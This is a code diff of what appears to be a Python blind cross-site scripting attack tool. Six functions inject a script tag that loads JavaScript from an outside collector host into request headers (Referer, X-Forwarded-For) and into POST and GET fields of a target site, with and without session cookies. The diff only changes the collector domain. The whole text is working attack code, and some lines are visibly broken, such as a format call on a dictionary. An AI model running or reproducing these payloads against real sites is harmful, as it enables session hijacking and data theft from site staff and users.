@@ -2,7 +2,7 @@ from helperfuncs_lib import Banner
 import requests
 
 def AttackHeaderValues(target,user):
-    payload = "'><sCriPt sRC=https://mmoz.today/xzort/s/" + user + "></sCRiPT>"
+    payload = "'><sCriPt sRC=https://xss.report/s/" + user + "></sCRiPT>"
     s = requests.Session()
     s.headers.update({'referer': payload})
     s.headers.update({'x-forwarded-for': payload})
@@ -18,7 +18,7 @@ def AttackHeaderValues(target,user):
     
 # Authenticated Attack HTTP Values
 def AttackHeaderValuesAuth(target,user,cookies):
-    payload = "'><sCriPt sRC=https://mmoz.today/xzort/s/" + user + "></sCRiPT>"
+    payload = "'><sCriPt sRC=https://xss.report/s/" + user + "></sCRiPT>"
     s = requests.Session()
     s.headers.update({'referer': payload})
     s.headers.update({'x-forwarded-for': payload})
@@ -34,7 +34,7 @@ def AttackHeaderValuesAuth(target,user,cookies):
     exit(1)
     
 def AttackPostValues(target,user,post):
-    payload = "'><sCriPt sRC=https://mmoz.today/xzort/s/" + user + "></sCRiPT>"
+    payload = "'><sCriPt sRC=https://xss.report/s/" + user + "></sCRiPT>"
     s = requests.Session()
     data = {'{0}':payload}.format(post)    
     s.post(target,data)
@@ -45,7 +45,7 @@ def AttackPostValues(target,user,post):
     
 # Authenticated Post Value Attack & Attack HTTP Values
 def AttackPostValuesAuth(target,user,post,cookies):
-    payload = "'><sCriPt sRC=https://mmoz.today/xzort/s/" + user + "></sCRiPT>"
+    payload = "'><sCriPt sRC=https://xss.report/s/" + user + "></sCRiPT>"
     s = requests.Session()
     s.headers.update({'referer': payload})
     s.headers.update({'x-forwarded-for': payload})
@@ -62,7 +62,7 @@ def AttackPostValuesAuth(target,user,post,cookies):
     exit(1)
     
 def AttackGetValues(target,user,get):
-    payload = "'><sCriPt sRC=https://mmoz.today/xzort/s/" + user + "></sCRiPT>"
+    payload = "'><sCriPt sRC=https://xss.report/s/" + user + "></sCRiPT>"
     s = requests.Session()
     data = {'{0}':payload}.format(get)    
     s.get(target,data)
@@ -73,7 +73,7 @@ def AttackGetValues(target,user,get):
     
 # Authenticated Get Value Attack & Attack HTTP Values
 def AttackGetValuesAuth(target,user,get,cookies):
-    payload = "'><sCriPt sRC=https://mmoz.today/xzort/s/" + user + "></sCRiPT>"
+    payload = "'><sCriPt sRC=https://xss.report/s/" + user + "></sCRiPT>"
     s = requests.Session()
     s.headers.update({'referer': payload})
     s.headers.update({'x-forwarded-for': payload})
